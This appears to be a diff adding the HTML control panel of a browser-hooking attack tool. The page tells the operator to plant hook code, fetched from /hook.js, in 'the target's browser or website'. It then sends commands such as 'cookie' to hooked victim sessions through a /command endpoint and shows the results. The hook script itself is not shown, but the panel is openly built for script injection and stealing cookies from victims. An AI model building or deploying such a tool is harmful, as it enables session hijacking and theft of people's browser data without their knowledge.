@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hook Generator</title>
+</head>
+<body>
+    <h1>Hook Generator</h1>
+    <p>Copy the following code to the target's browser or website:</p>
+    <textarea id="hookCode" rows="10" cols="80"></textarea>
+    <br>
+    <button onclick="generateHook()">Generate Hook</button>
+    <br>
+    <div id="console"></div>
+    <input type="text" id="sessionIdInput" placeholder="Session ID">
+    <input type="text" id="commandInput" placeholder="Command (e.g., cookie)">
+    <button onclick="sendCommand()">Send Command</button>
+    <script>
+        async function generateHook() {
+            const response = await fetch('/hook.js');
+            const hookCode = await response.text();
+            document.getElementById('hookCode').value = hookCode;
+        }
+        async function sendCommand() {
+        const sessionId = document.getElementById('sessionIdInput').value;
+        const command = document.getElementById('commandInput').value;
+        if (!sessionId || !command) {
+            document.getElementById('console').innerText = 'Please enter session ID and command.';
+            return;
+        }
+        const response = await fetch('/command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                session_id: sessionId,
+                command: command,
+            }),
+        });
+        const data = await response.json();
+        if(data.result){
+          document.getElementById('console').innerText = `Result: ${data.result}`;
+        }else{
+          document.getElementById('console').innerText = `Error: ${data.error}`;
+        }
+    }
+    </script>
+</body>
+</html>
